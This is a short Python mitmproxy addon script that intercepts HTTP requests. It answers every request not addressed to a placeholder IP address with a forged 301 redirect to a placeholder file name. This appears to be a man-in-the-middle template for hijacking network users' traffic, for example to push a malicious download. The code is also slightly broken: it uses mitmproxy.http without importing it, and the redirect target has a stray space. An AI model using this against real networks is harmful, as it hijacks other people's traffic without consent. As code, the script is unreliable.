import mitmproxy

def request(flow):
	if flow.request.host != "IP ADRESS":
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : " FILE NAME"}) 
		
		
------------------------------------------------------------------------------------------------------------------------
